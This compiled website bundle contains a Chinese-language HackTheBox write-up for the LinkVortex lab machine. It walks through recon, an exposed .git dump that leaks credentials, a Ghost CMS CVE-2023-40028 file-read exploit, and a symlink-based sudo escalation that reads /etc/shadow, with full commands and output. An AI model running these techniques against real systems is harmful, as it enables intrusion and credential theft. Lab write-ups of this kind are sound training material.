"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[5583],{43517:(n,e,s)=>{s.r(e),s.d(e,{assets:()=>l,contentTitle:()=>a,default:()=>h,frontMatter:()=>r,metadata:()=>i,toc:()=>c});const i=JSON.parse('{"id":"HackTheBox/Machines/LinkVortex/index","title":"LinkVortex","description":"Difficulty: Easy","source":"@site/docs/HackTheBox/Machines/LinkVortex/index.md","sourceDirName":"HackTheBox/Machines/LinkVortex","slug":"/HackTheBox/Machines/LinkVortex/","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Machines/LinkVortex/","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackTheBox/Machines/LinkVortex/index.md","tags":[],"version":"current","frontMatter":{},"sidebar":"HackTheBox_Sidebar","previous":{"title":"Headless","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Machines/Headless/"},"next":{"title":"Mist","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Machines/Mist/"}}');var t=s(74848),o=s(28453);const r={},a="LinkVortex",l={},c=[{value:"ENTRY POINT",id:"entry-point",level:2},{value:"\u4fe1\u606f\u641c\u96c6",id:"\u4fe1\u606f\u641c\u96c6",level:2},{value:"Port 80 Web Service",id:"port-80-web-service",level:2},{value:"Git \u654f\u611f\u4fe1\u606f\u6cc4\u9732",id:"git-\u654f\u611f\u4fe1\u606f\u6cc4\u9732",level:2},{value:"Ghost CMS CVE-2023-40028",id:"ghost-cms-cve-2023-40028",level:2},{value:"SSH bob",id:"ssh-bob",level:2},{value:"FLAG - USER",id:"flag---user",level:2},{value:"\u63d0\u6743\u81f3 root",id:"\u63d0\u6743\u81f3-root",level:2},{value:"FLAG - ROOT",id:"flag---root",level:2}];function d(n){const e={a:"a",admonition:"admonition",code:"code",h1:"h1",h2:"h2",header:"header",img:"img",p:"p",pre:"pre",...(0,o.R)(),...n.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(e.header,{children:(0,t.jsx)(e.h1,{id:"linkvortex",children:"LinkVortex"})}),"\n",(0,t.jsxs)(e.admonition,{type:"info",children:[(0,t.jsx)(e.p,{children:"Difficulty: Easy"}),(0,t.jsx)(e.p,{children:"Operating System: Linux"})]}),"\n",(0,t.jsx)(e.h2,{id:"entry-point",children:"ENTRY POINT"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-plaintext",children:"10.10.11.47\n"})}),"\n",(0,t.jsx)(e.h2,{id:"\u4fe1\u606f\u641c\u96c6",children:"\u4fe1\u606f\u641c\u96c6"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ sudo nmap -v --min-rate=2000 -A -p- 10.10.11.47\nNmap scan report for bogon (10.10.11.47)\nHost is up (0.17s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)\n|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)\n80/tcp open  http    Apache httpd\n| http-methods:\n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-server-header: Apache\n|_http-title: Did not follow redirect to http://linkvortex.htb/\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19\nUptime guess: 40.922 days (since Tue Feb 25 10:23:39 2025)\nNetwork Distance: 2 hops\nTCP Sequence Prediction: Difficulty=262 (Good luck!)\nIP ID Sequence Generation: All zeros\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,t.jsxs)(e.p,{children:["\u5c06 ",(0,t.jsx)(e.code,{children:"linkvortex.htb - 10.10.11.47"})," \u6dfb\u52a0\u5230 hosts \u8bb0\u5f55"]}),"\n",(0,t.jsx)(e.p,{children:"\u540c\u65f6\u5c1d\u8bd5\u7206\u7834\u5b50\u57df\u540d"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ gobuster vhost -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 200 --append-domain -u http://linkvortex.htb/\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:             http://linkvortex.htb/\n[+] Method:          GET\n[+] Threads:         200\n[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n[+] User Agent:      gobuster/3.6\n[+] Timeout:         10s\n[+] Append Domain:   true\n===============================================================\nStarting gobuster in VHOST enumeration mode\n===============================================================\nFound: dev.linkvortex.htb Status: 200 [Size: 2538]\nProgress: 4989 / 4990 (99.98%)\n===============================================================\nFinished\n===============================================================\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u4e00\u5e76\u66f4\u65b0 hosts \u8bb0\u5f55"}),"\n",(0,t.jsx)(e.h2,{id:"port-80-web-service",children:"Port 80 Web Service"}),"\n",(0,t.jsxs)(e.p,{children:["\u5c1d\u8bd5\u76f4\u63a5\u8bbf\u95ee ",(0,t.jsx)(e.code,{children:"linkvortex.htb"})]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{alt:"img",src:s(56545).A+"",width:"2560",height:"1371"})}),"\n",(0,t.jsxs)(e.p,{children:["\u5728\u9875\u9762\u5e95\u90e8\u53d1\u73b0 ",(0,t.jsx)(e.code,{children:"Powered by Ghost"})]}),"\n",(0,t.jsx)(e.p,{children:"\u5e76\u6839\u636e\u6846\u67b6\u6307\u7eb9\uff0c\u5f97\u5230\u7248\u672c\u4fe1\u606f"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{alt:"img",src:s(61826).A+"",width:"758",height:"830"})}),"\n",(0,t.jsxs)(e.p,{children:["\u53ef\u4ee5\u67e5\u8be2\u5230 ",(0,t.jsx)(e.a,{href:"https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028",children:"CVE-2023-40028 Ghost Arbitrary File Read"})," \u6f0f\u6d1e\u4fe1\u606f\uff0c\u4f46\u662f\u9700\u8981\u767b\u5f55\u51ed\u636e"]}),"\n",(0,t.jsxs)(e.p,{children:["\u5c1d\u8bd5\u8bbf\u95ee ",(0,t.jsx)(e.code,{children:"dev.linkvortex.htb"})]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{alt:"img",src:s(64962).A+"",width:"2560",height:"1371"})}),"\n",(0,t.jsx)(e.p,{children:"\u5c1d\u8bd5\u5bf9\u5176\u8fdb\u884c\u76ee\u5f55\u7206\u7834"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ dirsearch -u http://dev.linkvortex.htb/\n[08:43:37] 301 -  239B  - /.git  ->  http://dev.linkvortex.htb/.git/\n[08:43:37] 200 -  201B  - /.git/config\n[08:43:37] 200 -   73B  - /.git/description\n[08:43:37] 200 -   41B  - /.git/HEAD\n[08:43:37] 200 -  620B  - /.git/hooks/\n[08:43:37] 200 -  401B  - /.git/logs/\n[08:43:37] 200 -  240B  - /.git/info/exclude\n[08:43:37] 200 -  557B  - /.git/\n[08:43:37] 200 -  402B  - /.git/info/\n[08:43:38] 200 -  393B  - /.git/refs/\n[08:43:38] 200 -  175B  - /.git/logs/HEAD\n[08:43:38] 200 -  418B  - /.git/objects/\n[08:43:38] 200 -  147B  - /.git/packed-refs\n[08:43:38] 301 -  249B  - /.git/refs/tags  ->  http://dev.linkvortex.htb/.git/refs/tags/\n[08:43:38] 200 -  691KB - /.git/index\n"})}),"\n",(0,t.jsxs)(e.p,{children:["\u90a3\u4e48\u5c31\u5f88\u660e\u663e\u4e86\uff0c\u5b58\u5728\u6709 ",(0,t.jsx)(e.code,{children:".git"})," \u6e90\u7801\u6cc4\u9732"]}),"\n",(0,t.jsx)(e.h2,{id:"git-\u654f\u611f\u4fe1\u606f\u6cc4\u9732",children:"Git \u654f\u611f\u4fe1\u606f\u6cc4\u9732"}),"\n",(0,t.jsxs)(e.p,{children:["\u5c1d\u8bd5\u5c06 ",(0,t.jsx)(e.code,{children:"git"})," \u50a8\u5b58\u5e93 dump \u5230\u672c\u5730"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~/tmp/Hackthebx-LinkVortex]\n\u2514\u2500$ python3 ~/tools/GitHack/GitHack.py http://dev.linkvortex.htb/.git/\n......\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u5728 dump \u8fc7\u7a0b\u4e2d\u53ef\u4ee5\u53d1\u73b0\uff0cgit \u50a8\u5b58\u5e93\u5b58\u5728\u6709\u5927\u91cf\u7684\u6570\u636e\u4e22\u5931\uff0c\u6700\u7ec8\u53ea\u83b7\u5f97\u4e86\u4ee5\u4e0b\u4fe1\u606f"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~/tmp/Hackthebx-LinkVortex]\n\u2514\u2500$ tree -a\n.\n\u251c\u2500\u2500 dev.linkvortex.htb\n\u2502   \u251c\u2500\u2500 Dockerfile.ghost\n\u2502   \u2514\u2500\u2500 ghost\n\u2502       \u2514\u2500\u2500 core\n\u2502           \u2514\u2500\u2500 test\n\u2502               \u2514\u2500\u2500 regression\n\u2502                   \u2514\u2500\u2500 api\n\u2502                       \u2514\u2500\u2500 admin\n\u2502                           \u2514\u2500\u2500 authentication.test.js\n\u251c\u2500\u2500 .git\n\u2502   \u251c\u2500\u2500 config\n\u2502   \u251c\u2500\u2500 description\n\u2502   \u251c\u2500\u2500 HEAD\n\u2502   \u251c\u2500\u2500 index\n\u2502   \u251c\u2500\u2500 info\n\u2502   \u251c\u2500\u2500 logs\n\u2502   \u2502   \u251c\u2500\u2500 HEAD\n\u2502   \u2502   \u2514\u2500\u2500 refs\n\u2502   \u2502       \u251c\u2500\u2500 heads\n\u2502   \u2502       \u2514\u2500\u2500 remotes\n\u2502   \u251c\u2500\u2500 objects\n\u2502   \u2502   \u251c\u2500\u2500 29\n\u2502   \u2502   \u251c\u2500\u2500 Fo\n\u2502   \u2502   \u251c\u2500\u2500 HT\n\u2502   \u2502   \u251c\u2500\u2500 info\n\u2502   \u2502   \u251c\u2500\u2500 No\n\u2502   \u2502   \u251c\u2500\u2500 pack\n\u2502   \u2502   \u251c\u2500\u2500 re\n\u2502   \u2502   \u2514\u2500\u2500 UR\n\u2502   \u251c\u2500\u2500 packed-refs\n\u2502   \u2514\u2500\u2500 refs\n\u2502       \u251c\u2500\u2500 heads\n\u2502       \u251c\u2500\u2500 remotes\n\u2502       \u2514\u2500\u2500 tags\n\u2514\u2500\u2500 index\n\n27 directories, 9 files\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u770b\u4e00\u773c Docker \u6e90\u7801"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-docker",metastring:'title="Hackthebx-LinkVortex/dev.linkvortex.htb/Dockerfile.ghost"',children:'FROM ghost:5.58.0\n\n# Copy the config\nCOPY config.production.json /var/lib/ghost/config.production.json\n\n# Prevent installing packages\nRUN rm -rf /var/lib/apt/lists/* /etc/apt/sources.list* /usr/bin/apt-get /usr/bin/apt /usr/bin/dpkg /usr/sbin/dpkg /usr/bin/dpkg-deb /usr/sbin/dpkg-deb\n\n# Wait for the db to be ready first\nCOPY wait-for-it.sh /var/lib/ghost/wait-for-it.sh\nCOPY entry.sh /entry.sh\nRUN chmod +x /var/lib/ghost/wait-for-it.sh\nRUN chmod +x /entry.sh\n\nENTRYPOINT ["/entry.sh"]\nCMD ["node", "current/index.js"]\n'})}),"\n",(0,t.jsxs)(e.p,{children:["\u5bf9 ",(0,t.jsx)(e.code,{children:"dev.linkvortex.htb/ghost/core/test/regression/api/admin/authentication.test.js"})," \u6e90\u7801\u8fdb\u884c\u5206\u6790"]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{alt:"img",src:s(48367).A+"",width:"2560",height:"1541"})}),"\n",(0,t.jsx)(e.p,{children:"\u5728\u5176\u4e2d\u53d1\u73b0\u4ee5\u4e0b\u51ed\u636e"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-javascript",children:"const email = 'test@example.com';\nconst password = 'OctopiFociPilfer45';\n\nemail: 'test-leo@example.com',\npassword: 'thisissupersafe',\n\nemail: 'test-edit@example.com',\npassword: 'thisissupersafe',\n\nconst email = 'test@example.com';\nconst password = 'thisissupersafe';\n\npassword: 'lel123456',\nemail: 'not-invited@example.org',\n"})}),"\n",(0,t.jsxs)(e.p,{children:["\u76ee\u6d4b\u4e00\u4e0b\uff0c\u5c1d\u8bd5\u4f7f\u7528 ",(0,t.jsx)(e.code,{children:"OctopiFociPilfer45"})," \u767b\u5f55\u5230 ",(0,t.jsx)(e.code,{children:"http://linkvortex.htb/ghost/"})]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{alt:"img",src:s(73254).A+"",width:"2560",height:"1371"})}),"\n",(0,t.jsx)(e.p,{children:"\u6210\u529f\u8fdb\u5165\u5230\u540e\u53f0"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{alt:"img",src:s(99022).A+"",width:"2560",height:"1371"})}),"\n",(0,t.jsx)(e.h2,{id:"ghost-cms-cve-2023-40028",children:"Ghost CMS CVE-2023-40028"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~/tools/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028]\n\u2514\u2500$ ./CVE-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45 -h http://linkvortex.htb\nWELCOME TO THE CVE-2023-40028 SHELL\nEnter the file path to read (or type 'exit' to quit): /etc/passwd\nFile content:\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nnode:x:1000:1000::/home/node:/bin/bash\n"})}),"\n",(0,t.jsxs)(e.p,{children:["\u5c1d\u8bd5\u8bfb\u53d6\u4e0a\u6587\u5728 Docker \u6e90\u7801\u4e2d\u53d1\u73b0\u7684\u914d\u7f6e\u6587\u4ef6 ",(0,t.jsx)(e.code,{children:"/var/lib/ghost/config.production.json"})]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-json",children:'{\n    "url": "http://localhost:2368",\n    "server": {\n        "port": 2368,\n        "host": "::"\n    },\n    "mail": {\n        "transport": "Direct"\n    },\n    "logging": {\n        "transports": [\n            "stdout"\n        ]\n    },\n    "process": "systemd",\n    "paths": {\n        "contentPath": "/var/lib/ghost/content"\n    },\n    "spam": {\n        "user_login": {\n            "minWait": 1,\n            "maxWait": 604800000,\n            "freeRetries": 5000\n        }\n    },\n    "mail": {\n        "transport": "SMTP",\n        "options": {\n            "service": "Google",\n            "host": "linkvortex.htb",\n            "port": 587,\n            "auth": {\n                "user": "bob@linkvortex.htb",\n                "pass": "fibber-talented-worth"\n            }\n        }\n    }\n}\n'})}),"\n",(0,t.jsxs)(e.p,{children:["\u5728\u5176\u4e2d\u53d1\u73b0\u4e86\u4e00\u4e2a\u51ed\u636e ",(0,t.jsx)(e.code,{children:"bob@linkvortex.htb:fibber-talented-worth"})]}),"\n",(0,t.jsx)(e.h2,{id:"ssh-bob",children:"SSH bob"}),"\n",(0,t.jsx)(e.p,{children:"\u5c1d\u8bd5\u4f7f\u7528\u4e0a\u6587\u5f97\u5230\u7684\u51ed\u636e\u767b\u5f55\u5230 SSH"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~/tools/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028]\n\u2514\u2500$ pwncat-cs bob@linkvortex.htb\n[09:11:22] Welcome to pwncat \ud83d\udc08!\nPassword: *********************\n[09:11:31] linkvortex.htb:22: registered new host w/ db\n(local) pwncat$ back\n(remote) bob@linkvortex:/home/bob$ whoami\nbob\n"})}),"\n",(0,t.jsx)(e.h2,{id:"flag---user",children:"FLAG - USER"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-flag",metastring:'title="/home/bob/user.txt"',children:"5dba1ee073c7f16b17c7dc25ffd8a409\n"})}),"\n",(0,t.jsx)(e.h2,{id:"\u63d0\u6743\u81f3-root",children:"\u63d0\u6743\u81f3 root"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"(remote) bob@linkvortex:/home/bob$ getcap -r / 2>/dev/null\n/usr/bin/ping cap_net_raw=ep\n(remote) bob@linkvortex:/home/bob$ sudo -l\nMatching Defaults entries for bob on linkvortex:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT\n\nUser bob may run the following commands on linkvortex:\n    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png\n(remote) bob@linkvortex:/home/bob$ find / -perm -u=s -type f 2>/dev/null\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/libexec/polkit-agent-helper-1\n/usr/bin/chsh\n/usr/bin/umount\n/usr/bin/newgrp\n/usr/bin/mount\n/usr/bin/sudo\n/usr/bin/fusermount3\n/usr/bin/chfn\n/usr/bin/su\n/usr/bin/passwd\n/usr/bin/gpasswd\n"})}),"\n",(0,t.jsxs)(e.p,{children:["\u5206\u6790\u4e00\u4e0b ",(0,t.jsx)(e.code,{children:"/opt/ghost/clean_symlink.sh"})," \u7684\u903b\u8f91"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",metastring:'title="/opt/ghost/clean_symlink.sh"',children:'#!/bin/bash\n\nQUAR_DIR="/var/quarantined"\n\nif [-z $CHECK_CONTENT];then\n  CHECK_CONTENT=false\nfi\n\nLINK=$1\n\nif ! [["$LINK" =~ \\.png$]]; then\n  /usr/bin/echo "! First argument must be a png file !"\n  exit 2\nfi\n\nif /usr/bin/sudo /usr/bin/test -L $LINK;then\n  LINK_NAME=$(/usr/bin/basename $LINK)\n  LINK_TARGET=$(/usr/bin/readlink $LINK)\n  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq \'(etc|root)\';then\n    /usr/bin/echo "! Trying to read critical files, removing link [$LINK] !"\n    /usr/bin/unlink $LINK\n  else\n    /usr/bin/echo "Link found [$LINK] , moving it to quarantine"\n    /usr/bin/mv $LINK $QUAR_DIR/\n    if $CHECK_CONTENT;then\n      /usr/bin/echo "Content:"\n      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null\n    fi\n  fi\nfi\n'})}),"\n",(0,t.jsx)(e.p,{children:"\u53ef\u4ee5\u5c1d\u8bd5\u4f7f\u7528\u8fd9\u4e2a\u811a\u672c\u5b9e\u73b0\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"(remote) bob@linkvortex:/home/bob$ ln -s /etc/shadow shadow\n(remote) bob@linkvortex:/home/bob$ ln -s /home/bob/shadow shadow.png\n(remote) bob@linkvortex:/home/bob$ sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh *.png\nLink found [shadow.png] , moving it to quarantine\nContent:\nroot:$y$j9T$C3zg87gHwrCXO0vl4igIh/$iisf9sVwilKAi7mI5p1FqQslJWM9t2.YUWznIPC/XIA:19814:0:99999:7:::\ndaemon:*:19579:0:99999:7:::\nbin:*:19579:0:99999:7:::\nsys:*:19579:0:99999:7:::\nsync:*:19579:0:99999:7:::\ngames:*:19579:0:99999:7:::\nman:*:19579:0:99999:7:::\nlp:*:19579:0:99999:7:::\nmail:*:19579:0:99999:7:::\nnews:*:19579:0:99999:7:::\nuucp:*:19579:0:99999:7:::\nproxy:*:19579:0:99999:7:::\nwww-data:*:19579:0:99999:7:::\nbackup:*:19579:0:99999:7:::\nlist:*:19579:0:99999:7:::\nirc:*:19579:0:99999:7:::\ngnats:*:19579:0:99999:7:::\nnobody:*:19579:0:99999:7:::\n_apt:*:19579:0:99999:7:::\nsystemd-network:*:19579:0:99999:7:::\nsystemd-resolve:*:19579:0:99999:7:::\nmessagebus:*:19579:0:99999:7:::\nsystemd-timesync:*:19579:0:99999:7:::\npollinate:*:19579:0:99999:7:::\nsshd:*:19579:0:99999:7:::\nusbmux:*:19814:0:99999:7:::\nbob:$6$rounds=656000$4p3mw8hAd9ir.25f$ocGm9nW1TM2AB8Z.l0K.hi43bOrm3oxQsaKFACMoS2UL.tIXxSW3u/xsClrvkEhP5s.GUpdIvCX3qRtppDV8r.:19814:0:99999:7:::\ndnsmasq:*:19814:0:99999:7:::\n_laurel:!:20057::::::\n"})}),"\n",(0,t.jsxs)(e.p,{children:["\u8fd9\u4e2a\u65b9\u6848\u53ef\u4ee5\u76f4\u63a5\u8bfb\u53d6\u5230 ",(0,t.jsx)(e.code,{children:"root"})," \u7528\u6237\u7684 ",(0,t.jsx)(e.code,{children:".ssh"})," \u6587\u4ef6\u5939\u4e2d\u7684\u79c1\u94a5\u6587\u4ef6\uff0c\u4e5f\u53ef\u4ee5\u76f4\u63a5\u8bfb\u53d6\u5230 flag"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"(remote) bob@linkvortex:/home/bob$ ln -s /root/root.txt flag\n(remote) bob@linkvortex:/home/bob$ ln -s /home/bob/flag flag.png\n(remote) bob@linkvortex:/home/bob$ sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh *.png\nLink found [flag.png] , moving it to quarantine\nContent:\n6605dcb1170a6987abb6b5c4259bd10c\n"})}),"\n",(0,t.jsx)(e.h2,{id:"flag---root",children:"FLAG - ROOT"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-flag",metastring:'title="/root/root.txt"',children:"6605dcb1170a6987abb6b5c4259bd10c\n"})})]})}function h(n={}){const{wrapper:e}={...(0,o.R)(),...n.components};return e?(0,t.jsx)(e,{...n,children:(0,t.jsx)(d,{...n})}):d(n)}},73254:(n,e,s)=>{s.d(e,{A:()=>i});const i=s.p+"assets/images/image_20250401-090147-368770009806e331333e1cc8e139fb2f.png"},99022:(n,e,s)=>{s.d(e,{A:()=>i});const i=s.p+"assets/images/image_20250402-090205-ebc0770f77593e73070cf57259b2c090.png"},56545:(n,e,s)=>{s.d(e,{A:()=>i});const i=s.p+"assets/images/image_20250432-083230-866529eab9429c32601a99de23084fac.png"},61826:(n,e,s)=>{s.d(e,{A:()=>i});const i=s.p+"assets/images/image_20250433-083313-ed8bccb5a8d46b52d0dd713a2b5b2f99.png"},64962:(n,e,s)=>{s.d(e,{A:()=>i});const i=s.p+"assets/images/image_20250444-084404-93a565f8092f53d35640371007d06ff3.png"},48367:(n,e,s)=>{s.d(e,{A:()=>i});const i=s.p+"assets/images/image_20250457-085756-313042548885686ba8f1a05b908eed22.png"},28453:(n,e,s)=>{s.d(e,{R:()=>r,x:()=>a});var i=s(96540);const t={},o=i.createContext(t);function r(n){const e=i.useContext(o);return i.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function a(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(t):n.components||t:r(n.components),i.createElement(o.Provider,{value:e},n.children)}}}]);